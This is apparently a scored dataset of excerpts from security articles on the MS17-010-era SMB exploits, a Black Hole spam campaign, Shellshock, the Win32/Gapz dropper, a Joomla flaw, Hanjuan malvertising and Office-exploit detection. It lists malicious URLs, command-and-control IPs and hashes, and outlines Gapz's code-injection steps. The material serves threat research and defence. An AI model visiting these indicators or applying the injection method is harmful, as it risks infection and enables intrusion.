This exploit targets a vulnerability in SMBv1. It was patched in MS17-010 and affected Windows XP to Windows 8. This vulnerability was also seen to be widely exploited along with EternalBlue. It's a remote code execution vulnerability in SMBv1 and triggered while processing Transaction2/Transaction2 secondary requests.,0.009072751392558254
EternalRomance,0.008162878860487388
"This is also an SMBv1 exploit which targets Windows XP, 2003, Vista, 7, 8, 2008 and 2008 R2, and was patched in MS17‑010. Upon successful exploitation, it results in a privilege escalation.",0.011619726047868428
EmeraldThread,0.008828365126737348
"This exploit targets the old SMB vulnerability (CVE-2010-2729) that was patched in MS10-061 and affected Windows XP and Server 2003. This is a remote code execution vulnerability which lies in the Windows Print Spooler service. Upon successful exploitation, an unauthenticated user could gain complete control over the victim's machine.",0.011228933482502423
ErraticGopher,0.01067939350677305
This exploit targets an old vulnerability (CVE-2017-8461) and targets SMBv1. It's a remote code execution vulnerability in RPC server enabled with routing and remote access. This vulnerability is exploited over SMBv1.,0.00698595619918585
EskimoRoll,0.008535438738685674
This is a Kerberos exploit which targets multiple flavours of Windows server editions. It is a remote privilege escalation vulnerability in Kerberos KDC.,0.00951259063008647
EducatedScholar,0.008215609203042096
This exploit targets another old SMB vulnerability that was addressed in MS09-050. This is also a remote code execution vulnerability which allows the attacker to run arbitrary code on an unauthenticated SMB session. The attacker can control the system after successful exploitation.,0.006166166346928015
EternalSynergy,0.009040667780214173
This exploit targeted SMBv3 and was addressed in MS17‑010. It's a remote code execution flaw triggered in Windows 8 and Server 2012 SP0. It was also exploited in the wild.,0.010297804395362542
EclipsedWing,0.009140198167900015
"This exploit targets the Server service on Windows systems and was addressed in MS08-067. It's a remote code execution vulnerability (CVE-2008-4250) triggered through sending crafted RPC requests. This was very heavily exploited when it was disclosed and turned out to be a deadly worm. We still see exploitation of this vulnerability now, which clearly suggests the existence of unpatched systems.",0.009424173777606404
"Apart from the above exploits, Shadow Brokers also disclosed the 'EnglishmanDentist' (CVE-2017- 8487), 'EsteemAudit' (CVE-2017-0176), and 'ExplodingCan' (CVE-2017-7269) exploits.",0.014740646983559258
Microsoft advised users to upgrade to supported operating systems as these are not reproducible on them.,0.020085789446978475
EnglishmanDentist,0.010208568162215381
This exploit triggers the vulnerability in Outlook Exchange WebAccess.,0.010345058766099147
EsteemAudit,0.009148394578188501
This is an RDP exploit (CVE-2017-9073) which targets a vulnerability in Microsoft Remote Desktop Protocol and causes remote code execution. It can be used to open a backdoor in the victim's machine.,0.010229988897042852
ExplodingCan,0.006863258946903761
This is an IIS 6.0 exploit which enabled attackers to run remote code on the victim's machine.,0.009972255403147168
References,0.0158494738281566
[1] https://blogs.technet.microsoft.com/msrc/2017/04/14/protecting-customers-and- evaluating-risk/.,0.015835053687949352
[2] https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010.,0.0191401950861263
[3] https://github.com/worawit/MS17-010.,0.012266860984090577
[4] https://research.checkpoint.com/eternalblue-everything-know/.,0.01367024696386998
[5] https://www.risksense.com/_api/filesystem/466/EternalBlue_RiskSense-Exploit-Analysis-and-Port-to-Microsoft-Windows-10_v1_2.pdf.,0.011444737665567417
[6] http://blog.trendmicro.com/trendlabs-security-intelligence/ms17-010-eternalblue/.,0.01780452756451345
[7] https://zerosum0x0.blogspot.in/2017/04/doublepulsar-initial-smb-backdoor- ring.html.,0.009201327763344258
[8] https://www.countercept.com/our-thinking/analyzing-the-doublepulsar-kernel-dll-injection-technique/.,0.013488387261180068
[9] https://github.com/countercept/doublepulsar-detection-script.,0.013212255443775134
[10] http://www.opening-windows.com/download/apcinternals/2009-05/windows_vista_apc_internals.pdf.,0.013649733984170798
[11] https://msdn.microsoft.com/en-us/library/ee441928.aspx.,0.01703211783133185
[12] http://blogs.quickheal.com/ms17-010-windows-smb-server-exploitation-leads-ransomware-outbreak/.,0.012759310000258317
[13] http://blogs.quickheal.com/wannacrys-never-say-die-attitude-keeps-going/.,0.01476569249292714
[14] http://blogs.quickheal.com/wannacry-ransomware-recap-everything-need-know/.,0.01450578824801263
"[15] http://blogs.quickheal.com/wannacry-ransomware-creating-havoc-worldwide-exploiting-patched-windows-exploit/.
",0.012253278730298467
"Think you’ve received an online greeting card from 123greetings.com? Think twice!
Over the past couple of days, cybercriminals have spamvertised millions of emails impersonating the popular e-card service 123greetings.com in an attempt to trick end and corporate users into clicking on client-side exploits and malware serving links, courtesy of the Black Hole web malware exploitation kit.
What’s so special about this campaign? Can we connect it to previously spamvertised campaigns profiled at Webroot’s Threat Blog? Let’s find out.
More details:",0.015148315241502286
Screenshot of the spamvertised email:,0.01024206182675269
"Upon clicking on any of the links found in the malicious emails, users are exposed to the following bogus “Page loading…” page:",0.011177113391871774
Obfuscated java script redirection:,0.006637634007486182
"Spamvertised malicious URLs: hxxp://bjflm.cn/postc.html; hxxp://minihotel74.com/pcard.html; hxxp://wowgame.net.cn/pcard.html; hxxp://phototula.ru/postc.html; hxxp://joanjoy.com/postc.html; hxxp://akrepilaclama.org/wp-content/plugins/akismet/greet.html; hxxp://vinointhevalley.com/wp-content/plugins/akismet/greet.html
Client-side exploits serving URLs: hxxp://remindingwands.org/main.php?page=861097b084221fd8 – 78.87.123.114; hxxp://voicecontroldevotes.info/main.php?page=6df8994172330e77; hxxp://immigrationunix.pro/main.php?page=28677a727aff0456
Client-side exploits served: CVE-2010-1885
Upon sucessful exploitation, the campaign drops MD5: 42307705ad637c615a6ed5fbf1e755d1 – detected by 25 out of 42 antivirus scanners as Trojan.Win32.Yakes.ansm; Mal/Katusha-I.
Upon successful execution, the sample phones back to 87.120.41.155:8080/mx5/B/in
More MD5s are known to have phoned back to the same command and control server, such as for instance:
MD5: b11421acddbfc94544482d1846ba6d97
MD5: 4e0053fe00b65627c07dc8c85c85a351
MD5: 90d1b3367e97f384af029b0f1674f7ff
MD5: d2be252de958b7435279c6e8f270de4e
87.120.41.155 is actually a name server offering DNS resolving services to related malicious and command and control servers part of the campaign such as:
spb-koalitia.ru
onerussiaboard.ru
mysqlfordummys.ru
online-gaminatore.ru
leprisoruim.ru
switched-games.ru
ipadvssonyx.ru
online-cammunity.ru
zenedin-zidane.ru
porschedesignrussia.ru
Associated malicious name servers part of the campaign’s infrastructure:
ns1.spb-koalitia.ru – 62.76.190.208
ns2.spb-koalitia.ru – 203.172.140.202
ns3.spb-koalitia.ru – 87.120.41.155
ns4.spb-koalitia.ru – 173.224.208.60
ns5.spb-koalitia.ru – 62.76.188.138
ns1.onerussiaboard.ru – 62.76.190.208
ns2.onerussiaboard.ru – 203.172.140.202
ns3.onerussiaboard.ru – 87.120.41.155
ns4.onerussiaboard.ru – 173.224.208.60
ns5.onerussiaboard.ru – 62.76.188.138
ns1.mysqlfordummys.ru – 62.76.190.208
ns2.mysqlfordummys.ru – 203.172.140.202
ns3.mysqlfordummys.ru – 87.120.41.155
ns4.mysqlfordummys.ru – 173.224.208.60
ns5.mysqlfordummys.ru – 62.76.188.138
ns1.online-gaminatore.ru – 62.213.64.161
ns2.online-gaminatore.ru – 85.143.166.243
ns3.online-gaminatore.ru – 41.66.137.155
ns4.online-gaminatore.ru – 184.106.189.124
ns5.online-gaminatore.ru – 203.172.140.202
ns6.online-gaminatore.ru – 87.120.41.155
ns1.leprisoruim.ru – 62.76.190.208
ns2.leprisoruim.ru – 203.172.140.202
ns3.leprisoruim.ru – 87.120.41.155
ns4.leprisoruim.ru – 173.224.208.60
ns5.leprisoruim.ru – 62.76.188.138
ns1.switched-games.ru – 62.213.64.161
ns2.switched-games.ru – 85.143.166.243
ns3.switched-games.ru – 41.66.137.155
ns4.switched-games.ru – 184.106.189.124
ns5.switched-games.ru – 203.172.140.202
ns6.switched-games.ru – 87.120.41.155
ns1.ipadvssonyx.ru => 62.76.190.208
ns2.ipadvssonyx.ru => 203.172.140.202
ns3.ipadvssonyx.ru => 87.120.41.155
ns4.ipadvssonyx.ru => 173.224.208.60
ns5.ipadvssonyx.ru => 62.76.188.138
ns1.online-cammunity.ru – 62.76.190.208
ns2.online-cammunity.ru – 203.172.140.202
ns3.online-cammunity.ru – 87.120.41.155
ns4.online-cammunity.ru – 173.224.208.60
ns5.online-cammunity.ru – 62.76.188.138
ns1.zenedin-zidane.ru – 62.213.64.161
ns2.zenedin-zidane.ru – 85.143.166.243
ns3.zenedin-zidane.ru – 41.66.137.155
ns4.zenedin-zidane.ru – 184.106.189.124
ns5.zenedin-zidane.ru – 203.172.140.202
ns6.zenedin-zidane.ru – 87.120.41.155
ns1.porschedesignrussia.ru – 62.213.64.161
ns2.porschedesignrussia.ru – 85.143.166.243
ns3.porschedesignrussia.ru – 41.66.137.155
ns4.porschedesignrussia.ru – 184.106.189.124
ns5.porschedesignrussia.ru – 203.172.140.202
ns6.porschedesignrussia.ru – 87.120.41.155
Related client-side exploits and malware serving URLs spamvertised in the same campaign, also drop MD5: cd0aac6df71fa28d4564406a24f7e1a2 – detected by 28 out of 42 antivirus scanners as Gen:Variant.Zusy.15382; P2P-Worm.Win32.Palevo.fbvx
The second sample phones back to 87.204.199.100:8080/mx5/B/in/ not surprisingly, we’ve already seen this command and control server used in numerous profiled campaigns, such as, for instance, the AT&T Billing Center impersonation one, the Craigslist spam campaign, the PayPal spam campaign, the eBay spam campaign, and the American Airlines themed spam campaign.
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.011001930002025762
"How to resolve Shellshock on Mac OS X, web servers and more
The ""Bash Bug"" or ""Shellshock"" vulnerability means a wide range of devices, servers and computers, including Mac OS X, will need to be patched to prevent abuse by malicious persons. Here's advice about what to do and links to more in-depth resources.",0.012318545441477147
25 Sep 2014 - 10:46PM,0.01144531298008733
"The “Bash Bug” or “Shellshock” vulnerability means a wide range of devices, servers and computers, including Mac OS X, will need to be patched to prevent abuse by malicious persons. Here’s advice about what to do and links to more in-depth resources.",0.011603858002432577
"A serious software vulnerability called the “Bash Bug” or “Shellshock” has just come to light and it affects a wide range of computers and digital devices, many of which will need to be fixed to prevent them leaking information or being taken over by malicious persons. The systems affected include Mac OS X computers, many web servers, and some home networking devices like routers. This blog post offers some preliminary advice about what to do in response to Shellshock, as well as links to more in-depth resources that should be helpful to more technically-minded readers.",0.010199680217265805
"[Update: Apple has released “OS X bash update 1.0” to protect Mac OS X systems from this problem. Now available for: Mavericks, Mountain Lion, and Lion. Users of Mavericks should note that there was a recent OS X upgrade from 10.9.4 to 10.9.5 and you must install that before installing the bash fix.]",0.011424947562313714
[Update: New Knowledgebase article: What is Shellshock and does ESET protect me from it?.],0.01114893908352721
What is the problem?,0.009952501452159201
"The official name of this vulnerability is the GNU Bash Remote Code Execution Vulnerability (CVE-2014-6271) and it is a serious one, on a par with Heartbleed, and it could enable an attacker to gain control over a targeted computer. Of course, all of that might sound irrelevant to the average Internet user who has never heard of bash. So I will let my colleague Cameron Camp, an experienced Linux user, set the scene with five main points. After that we will offer some advice for different groups of people affected by this bug. Here’s Cameron:",0.014201236275799167
"Bash is short for Bourne-again shell and it is the command line interface that most folks use on a Linux and sometimes BSD Mac servers and computers. So basically Bash is the primary way you give your Linux server commands, turn stuff on and off, start web servers and so on: it’s how you manually manage your server 90% of the time. Think of it as what your desktop is to a Windows or Mac machine, but for servers. But Bash is more than that, it’s also the nuts and bolts of how a large chunk of the Linux server itself launches and controls operations that it executes all the time like scheduling tasks, doing updates, and the like.
Bash doesn’t just run on normal Linux serverish things, it’s loaded on a significant percentage of home routers, smart meters, smart appliances, smart cars, and other stuff that you don’t really think of as running Linux. Basically a huge chunk of things that route Internet traffic run bash. This extends to the core routing of data centers and facilities like that around the world.
Right now we are at the very beginning of the “what could this break” cycle. Already we know that it could break CGI scripts running on Apache boxes. Okay, but there’s a ton of other exploits possible once someone weaponizes this, and before folks have a chance to patch their devices. Some vulnerability scanning is now going around, undoubtedly lots more will follow. Keep in mind that some BSD/Linux boxes haven’t been rebooted in five years or more! They often lag behind on updates to fix security issues.e
I’m watching the traffic stream on some trust groups right now and the messages are flying around, with folks sharing data back and forth about active exploit attempts, so that’s good, but these groups are very technical, so that information has to be translated for public consumption accompanied by practical advice.
Lastly, in simple terms, breaking Bash means you can tell a server to execute something without really authenticating, so it’s sort of like telling bash to go do stuff without being logged in, which definitely fits the definition of “a very bad thing”.",0.014949510726524728
Where can I get more technical details?,0.013675775306125737
"Robert Graham writing on the Errata Security Blog (go to the home page for the latest).
Troy Hunt writing on troyhunt.com.
Discussion of the bash bug on Apple Support Communities.
Jame Blasco at AlienVault is reporting some of the early attempts to exploit this bug.",0.015623114967890261
How does it affect/impact me?,0.010123493430547303
"Windows users: your machines are fine, but you could be at risk of malicious code infection when visiting web servers compromised by exploitation of Shellshock. Now is a good time to make sure your anti-malware is up-to-date.
Mac users: sadly the bash that comes with Mac OS X is vulnerable until patched. We are awaiting a patch from Apple. Look for this and install it right away. Now is a good time to make sure your anti-malware is up-to-date.
Home Internet users, domestic network operators: We do not yet have a definitive list of which devices are affected. For now, assume that yours is and stand by for updates from your ISP or the router manufacturer while monitoring sites like We Live Security for more information about active threats exploiting this vulnerability. If you want to be pro-active, check out the support forum for your ISP or router vendor. Email or phone them to find out if your device is affected. Also, check that your anti-malware is up-to-date.
SOHO and SMB: Same as above if you are doing your own IT. If you use a Managed Service Provider, check with them.
IT departments: Review all systems that use bash and follow appropriate remediation steps as reported by Linux distributors, such as RedHat and Debian and Ubuntu. There is a lot of information on this NGINX page and this Cisco page.
Anyone with a website hosted by web hosting company: Check their support page for news and updates.
Anyone with a virtual private server: Check with your provider’s support page. You may need to tackle this issue yourself, in which case engage an appropriate expert.",0.01558207153475899
We are monitoring developments related to the Shellshock bash bug vulnerability and will post updates to the We Live Security blog.,0.01650915868195524
"Major hat tip to Cameron, not only for clarifying several technical points, but also for engaging in the Linux community, pushing patches, and fixes.
",0.016840367670348466
"Win32/Gapz: steps of evolution
Win32/Gapz has a new technique for code injection and a new VBR infection method. The dropper has many tricks for bypassing detection by security software.",0.013460450454171102
27 Dec 2012 - 02:00AM,0.011508893531910536
Win32/Gapz has a new technique for code injection and a new VBR infection method. The dropper has many tricks for bypassing detection by security software.,0.012915662852209131
"The Win32/Gapz malware family was mentioned publicly for the first time in the middle of November 2012, by the Russian antivirus company Doctor Web (Trojan.Gapz.1 infecting Windows in a new manner). But I didn’t find the technical details about this threat in that report and so prepared a deeper analysis. Win32/Gapz uses many exploitation techniques for implementing local privilege escalation (LPE) and infecting the VBR (Volume Boot Record) and MBR (Master Boot Record) in the earliest samples seen. The first interesting finding is that the VBR infection method is really new and not something we’ve seen before in other bootkit families. And the second interesting characteristic is the method used for injecting the malicious payload into user-mode system processes.",0.01771305272108159
The VBR infector changes only four bytes in bootstrap code in order to get control so as to deliver the malicious shellcode payload. Another interesting detail is that Win32/Gapz doesn’t have a malicious driver and all the bootkit functionality is loaded with the operating system boot process as shellcode sequences. More details about the bootkit part of the malware have been prepared by my colleague Eugene Rodionov (Win32/Gapz: New Bootkit Technique). In this blog post I focus on describing some interesting tricks used by the Gapz dropper. At the time of publication we have information about three different versions of the dropper. The characteristics of each of these dropper versions are presented in the following table:,0.01457628299490954
"The first known version of the dropper was compiled at the end of April, but this version names many internal debug strings and it’s possible that this version was not developed for mass distribution. It seems likely that Win32/Gapz started mass distribution at the end of summer or beginning of September. The latest versions of the dropper use three approaches to escalating privilege:",0.011316633969689627
"CVE-2011-3402 (TrueType Font Parsing Vulnerability)
CVE-2010-4398 (Driver Improper Interaction with Windows Kernel Vulnerability)
COM Elevation (UAC whitelist)",0.01794260755409094
The mechanism for escalating privilege using a COM Elevation technique trick on 64-bit systems has already been already described in my blog post about purple haze TDL4 modification (TDL4 reloaded: Purple Haze all in my brain).,0.011812028146342857
But none of these exploitation techniques are new and patches have already been made available. The most interesting part of the dropper is its new technique for code injection into the user-mode address space.,0.011590818516435952
What versions of MS Windows can be infected?,0.01154306751047407
"During the infection process the dropper checks the version of the operating system in use, using the following code:",0.017000336276027705
Win32/Gapz is capable of infecting the following versions of Microsoft Windows operating systems:,0.008249544053701263
•                x86: Windows XP SP2 and higher (except Windows Vista and Vista SP1),0.019787021931614857
•                x64: Windows Vista SP2 and higher,0.009126734881037213
"The current version of theWin32/Gapz dropper is able to infect WinXP and Win7 including x64 versions, but on Win8 the bootkit part does not work reliably after infection and the kernel-mode code is not executed after the system has booted.",0.013421030074075135
Gapz dropper,0.006750725389599532
The malware is installed on to the system by means of quite an elaborate dropper. Besides installing malware the dropper is also able to bypass HIPS and elevate its privileges. What makes it interesting is the detail of its implementation. If we look at what the dropper exports we will see the following picture:,0.010066054900192967
"There are three exported routines to which we should pay attention: start, icmnf and isyspf. Here is a brief description of each of them:",0.01450572586327481
"start – the dropper’s entry point injects the dropper into explorer.exe address space
icmnf – responsible for elevating privileges
isyspf – performs infection of the victim’s host machine.",0.011398662043798913
The following diagram depicts the sequence of their execution and the activities that they perform:,0.011176911084610275
Gapz code injection technique,0.005666381969345546
"Win32/Gapz uses a non-standard technique for code injection in all known dropper versions. This approach allows it to inject code into explorer.exe address space, bypassing security software. This technique works on all current versions of Microsoft Windows operating system. Its essence is to inject a shellcode into the Explorer process that loads and executes the malicious image. Here is the number of steps required to achieve this outcome:",0.011002112299780542
"Open one of the shared sections from BaseNamedObjects mapped into explorer.exe address space, and write shellcode into this section
After the first step shellcode is already written to explorer.exe address space and the next step is for the dropper to search for the window “Shell_TrayWnd”
The dropper calls the WinAPI function GetWindowLong() so as to get the address of the routine related to the “Shell_TrayWnd” window handler
At the next step the dropper calls WinAPI function SetWindowLong() to modify “Shell_TrayWnd” window-related data
It calls SendNotifyMessage() to trigger shellcode execution in explorer.exe address space.",0.016841783113142883
Here is the list of the section in BaseNamedObjects for which the malware looks for during step 1:,0.007212547427740468
Once the section is opened malware writes the shellcode at the end of it as shown below:,0.012328928400582861
After SendNotifyMessage() is executed “Shell_TrayWnd” receives and transfers control to the address pointed to by the value previously set by SetWindowLong(). The address points to the KiUserApcDispatcher() routine:,0.00847719925929813
"This eventually results in transferring control to the shellcode mapped into explorer process address space, as presented in the following figure:",0.011693097832538912
The shellcode creates the thread in explorer.exe process context and restores the original value previously changed by SetWindowLong() WinAPI function. The newly created thread runs the next part of the dropper for escalating privilege. After the dropper obtains sufficient privileges it attempts to infect the system.,0.012211401675894074
Why this threat named Gapz?,0.010485189623779867
"Good question, and on this occasion it’s not a random choice of name. The GAPZ string is used as a tag for allocating the memory region in the shellcode as well in the kernel-mode. Its code looks like this:",0.010377612650876111
Interesting feature of Win32/Gapz.C dropper,0.007097408246031334
The oldest known version of the dropper (Win32/Gapz.C) used a special log file stored in the %TEMP% directory and wrote extended debugging information. The log file after a successful infection looks like this:,0.013787852096077469
Conclusion,0.008171308922719556
"Win32/Gapz is a really interesting threat, containing a new technique for code injection never seen before in other malware families, and a new VBR infection method. The dropper has many tricks for bypassing detection by popular security software. Shellcode techniques used in Gapz make this dropper difficult to research. According to ESET’s LiveGrid  telemetry, not many detections of this threat have been seen, but in the coming year this platform for stealth infection may become more popular. In my opinion Win32/Gapz one of the most interesting complex threats of 2012.",0.015005501182808634
Special thanks to my colleague Anton Cherepanov.,0.01683172592277693
"Aleksandr Matrosov, Security Intelligence Team Lead",0.010083666225937482
SHA1 hashes for the Win32/Gapz dropper samples mentioned are shown in the following table:,0.017745223909929386
Detection name,0.009031734700781224
SHA1 hash,0.009312383294012183
Description,0.014276898542484706
"Win32/Gapz.A
Win32/Gapz.A
Win32/Exploit.CVE-2011-3402.D
Win32/Exploit.CVE-2011-3402.D
1f206ea64fb3ccbe0cd7ff7972bef2592bb30c84
dff6933199137cc49c2af5f73a2d431ce2e41084
ed5b59e81b397ab053d8aa52dbb89437143a9a45
5911487fc0b208f7884a34edfcb60a4de9a487eb",0.010181441891637943
"dropper
dropper
exploit (XP)
exploit (Win7)",0.01031056500063221
"Win32/Gapz.B
e4b64c3672e98dc78c5a356a68f89e02154ce9a6",0.008179718476649
dropper,0.0075717859448050095
"Win32/Gapz.C
Win32/Gapz.C
85fb77682705b06a77d73638df3b22ac1dbab78b
b37afc51104688ea74d279b690d8631d4c0db2ad",0.009111864053357399
"dropper
MBR
",0.0076278474513336025
Joomla Account Creation Vulnerability,0.006872306650471782
"The Joomla team released a patch for a serious security vulnerability affecting all Joomla versions from 3.4.4 and up. If you’re using one of these versions of Joomla, you’re encouraged to update immediately.
The vulnerability has a high severity as it allows anyone to create a user remotely and specify the desired group permission to it, including administrator. Two CVE’s were assigned to these vulnerabilities: CVE-2016-8870 and CVE-2016-8869. We highly recommend that everyone apply these patches ASAP.
Sucuri Firewall Virtual Patching
As soon as we learned about this issue, our vulnerability research team (led by Marc MontPas) went on to reverse-engineer the patch and find out how it can be exploited in order to protect our users. We found out that it is present on an old controller used for backwards compatibility. We were able to create a virtual patching signature and push it live to all of our users within minutes.
The good news now is that if you have your site behind our Sucuri Firewall you are protected against this issue.
We also took some time to go back to our log data to see if this attack was ever used in the wild. So far, we didn’t find a single exploit attempt of it. This will likely change, as the attackers will also try to reverse the patch to find out how they can leverage it to create admin users on Joomla sites in order to compromise them for malware distribution, phishing, DDoS, and more. If your website has been compromised you can follow our free guide to fix hacked Joomla sites.
",0.012966660943598662
"Hanjuan EK’s ‘March Madness’ malvertising campaign
Update: The ad network, Engage:BDR terminated the malvertising account quickly after notification, on Monday at 10:32AM. We can confirm that this campaign is no longer active.",0.011536822984095751
"The lesser known and stealthy Hanjuan Exploit Kit, which for almost two months was using a Flash Player zero-day (CVE-2015-0313) to infect unsuspecting users, has been quite active again during the past couple of weeks.
The current malvertising campaign stems from an ad network and has affected several high profile sites:",0.01237157268449085
"nydailynews.com
metacafe.com",0.011558942979184583
A seemingly innocent looking ad side-loads a malicious URL with absolutely no user interaction (no click required).,0.023512236157183786
"People surfing with Adobe Flash Player 16.0.0.296 or below are vulnerable to a drive-by download attack that happens within seconds in the background.
Exploit URLs
www.entvotil.com/johuo.swf
www.qumeria.com/iswu.swf
www.fieldop.net/oueob.swf
www1.tresil.net/imhgcbj.swf
www3.vayield.com/aaegdct.swf
www2.vayield.com/test9.swf
www2.chokaro.com/tujji.php
Exploit analysis (Hanjuan EK)
We’re seeing rotating domains exhibiting similar patterns.",0.010208424598748933
"Fake advert page with iframe to an exploit landing page
Exploit landing page
Flash exploit (CVE-2015-0313)",0.01472478732632787
"Fake advert page
This simple html page contains an image, supposedly for an ad banner. Right below is an iframe to the exploit landing page.",0.014337838556651938
"Landing page
It consists of obfuscated JavaScript code (green highlight) that dynamically loads a Flash Player object (red highlight):",0.010310251815927707
"Flash Player exploit (CVE-2015-0313)
This Flash Player exploit was used in Dec 2014 up until Feb 2015 in a large zero-day campaign.",0.013060766861942796
"Payload
Because Hanjuan is extremely stealth we don’t have a good visibility on the malware payload. Hanjuan targets US residential IP addresses and is known to evade VPNs and security researchers honeypots.
Malvertising numbers
The CPM (cost per thousand) for the malicious ad banners averaged $0.45. In other words, exposing one thousand users to this malware campaign only cost about half a dollar.
Protection
We urge users to update their Flash Player to the latest version by going to Adobe’s official site here. Additionally, we strongly recommend using Anti-Exploit protection as an additional layer of security.
Malwarebytes Anti-Exploit users were already protected against this threat, even if they forgot to patch their machines:",0.015990354120380745
"Malvertising still represents the largest threat when it comes to drive-by download attacks because it is cheap to implement and yet very effective.
The bad guys are praying on people visiting popular sites with vulnerable computers and the fact of the matter is that this approach is very successful.
Publishers, ad networks and advertisers are part of this problem although not always directly aware that it is happening to them. For this reason end users should take matters into their own hands and protect their devices.
We have informed the ad network and hope for a quick resolution.
",0.014071590320563265
VB2019 paper: Static analysis methods for detection of Microsoft Office exploits,0.008171331040476293
Chintan Shah,0.009307364958595632
"McAfee, India",0.009435894247118992
"Table of contents
Abstract Introduction Static analysis of RTF (Rich Text Format) files RTF control words Malicious code inside embedded Microsoft OLE objects Links to external resources inside embedded Microsoft OLE objects Overlay data in RTF files Embedded files inside RTF documents Static analysis of MS-OOXML (Microsoft Office Open XML) format Suspicious loading of ActiveX objects Identifying ROP chains and sledges in OLE object Static analysis of MS-CFB (Microsoft Compound File Binary File) format Scanning storage and stream objects Extraction and analysis of VB macro code High-level implementation of the static analysis engine Results over in-the-wild exploits Mixed exploits detection results",0.02165169860209304
Abstract,0.009485057568311417
"Despite recent advances in exploitation strategies and exploit mitigation techniques, fundamental infection vectors remain the same. It is critical to advance security solutions to inspect both new and known infection vectors in order to successfully mitigate targeted attacks. Apparently, the use of lure documents has become one of the most favoured attack strategies for infiltrating target organizations. Recently, some of the most high impact attacks using this conventional technique have been uncovered by the security community.",0.019072562267844373
"In this paper, we present an exploit detection tool that we built for the purpose of detecting malicious lure documents. This detection engine employs multiple binary stream analysis techniques for flagging malicious Office documents, supporting static analysis of RTF, Office Open XML and Compound Binary File format (MS-CFB). The use, by attackers, of weaponized lure documents necessitates deeper inspection of these file formats at the perimeter.",0.021375607890595227
"Object Linking and Embedding exposes a rich attack surface which has been abused by attackers over the past few years to hide malicious resources. For instance, OOXML files can be used to load OLE controls which can eventually facilitate remote code execution. Our proposed detection tool is built to extract embedded storage streams, OLE objects, etc. and apply binary stream analysis techniques over it, in addition to inspecting specific file sections and analysing embedded scripts, to identify malicious code. This detection tool had been tested over a wide set of in-the-wild exploits and variants.",0.01081421442576469
Introduction,0.012036720276026314
"It is hardly surprising that some of the most infamous targeted attacks that we have spotted in the past used conventional attack vectors and infection techniques to penetrate their target organizations. Multiple attacks using lure documents have been uncovered by the security community over the last year. Since attackers using this technique to execute phishing attacks would most likely deliver the weaponized exploit documents to the target, it becomes a pressing need for any perimeter security solution to investigate these file formats a little deeper for signs of maliciousness. Network and endpoint security solutions have the capability to look deeper into several file formats, but seemingly have limited detection capability of weaponized documents exploiting zero-day vulnerabilities. Modern sandboxing solutions also support analysis of multiple file formats, but often do not provide complete behaviour visibility. It is critical to augment the exploit detection capability of these solutions with an engine that can perform static inspection of files and classify documents based on the characteristics of the embedded binary content.",0.016854209836577927
"Object Linking and Embedding (OLE), a technology based on Component Object Model (COM), is one of the features in Microsoft Office documents which allows the objects created in other Windows applications to be linked or embedded into documents, thereby creating a compound document structure and providing a richer user experience. OLE had been massively abused by attackers over the past few years in a variety of ways. OLE exploits in the recent past have been observed either loading COM objects to orchestrate and control the process memory, taking advantage of the parsing vulnerabilities of the COM objects, hiding malicious code or connecting to external resources to download additional malware. We have had multiple instances of OLE exploits using the multi-COM loading method to execute an attack. With this, it becomes vital for any security solution to inspect documents at the perimeter before they reach the endpoint. Additionally, it is fundamental to inspect other attack surfaces like embedded scripts, Flash files, etc. to be able to detect unknown attacks.",0.01597109849480205
"In the following sections, we describe the Static Analysis Engine (SAE) that we implemented for a similar purpose. The Static Analysis Engine supports the inspection of OLE Compound Binary File format (MS-CFB), Rich Text Format (RTF) and OOXML file format, and applies binary stream analysis techniques to identify unusual streams of data. SAE utilizes the underlying document parsing capabilities to extract all the embedded or linked COM objects from Microsoft Office documents and further analyses them for any suspicious or malicious indicators. It also extracts the embedded object and storage streams from the Compound Binary File format and explores the possibility of injected malicious code by emulating and statically analysing these streams. It is also important to analyse known attack surfaces such as embedded VB macro scripts, since targeted attacks using lure documents with obfuscated macro scripts have been on the rise. It is crucial to look for attack vectors that deliver other file format exploits, such as Flash files, from within the Microsoft Office documents, extract and probe them for any possible malicious indications.",0.017718955907472522
"In the following sections, we walk through some of the malicious indicators, inspection methods and heuristics implemented by the SAE over the various file formats and share some of the initial observed results towards the end. However, the methods outlined here are by no means an exhaustive list.",0.013961891767842571
Static analysis of RTF (Rich Text Format) files,0.018097551071571405
"RTF documents have been one of the primary exploitation targets. Attackers have predominantly used RTF parsing and logic vulnerabilities to deliver malware and execute attacks. In the following sections, we highlight some of the inspection methods for identifying malicious RTF documents.",0.017348133441289493
RTF control words,0.007519834753523469
"Rich Text Format files are heavily formatted using control words. Control words in RTF files primarily define the way a document is presented to the user. Since these RTF control words have associated parameters and data, parsing errors for them can become the primary target for exploitation. Exploits in the past have been found using control words to embed malicious resources as well. Consequently, it becomes important to examine destination control words that consume data, and to extract and analyse the embedded binary stream for malicious indicators. Figures 1 to 3 show a few instances of past exploits using control word parameters to introduce malicious code or executable payloads.",0.019779051103709477
Figure 1: A previous exploit with embedded binary data inside the ‘PFragments’ RTF control word.,0.012828981550127683
Figure 2: CVE-2012-0158: Embedded executable payload inside the ‘datastore’ RTF control word.,0.013462765297983736
Figure 3: CVE-2014-1761: Embedded shellcode inside the ‘listlevel’ RTF control word.,0.012871768853907506
"It is crucial for the Static Analysis Engine to scan the destination control words, especially those that consume data, since these could be the target for hiding the malicious content. Microsoft RTF specifications mention several such destination control words, a snapshot of which is shown in Figure 4.",0.011115211924959345
Figure 4: Microsoft RTF specifications mention several destination control words that consume data.,0.01412431280076265
"To be able to generically detect such auxiliary strategies, an RTF document parser must be able to scan the control words that consume data and extract the stream, so that it can be passed on for additional scanning. RTF parsers must also be able to handle the control word obfuscation mechanisms commonly used by attackers, otherwise significant detections could be missed. The Static Analysis Engine integrates an RTF parser which performs sanity checks for such obfuscation attempts and extracts the data for the specific control words, apparently for performance reasons, which are then passed onto the supplementary scanning module. Figure 5 shows one of the instances as described previously: SAE extracts the data consumed by the ‘datastore’ control word and then passes it on to the stream analyser, which identifies the embedded single-byte XORed executable payload.",0.01712628498830593
Figure 5: The SAE extracts the data consumed by the ‘datastore’ control word and then passes it to the stream analyser.,0.014047124735099503
Malicious code inside embedded Microsoft OLE objects,0.00833658358665157
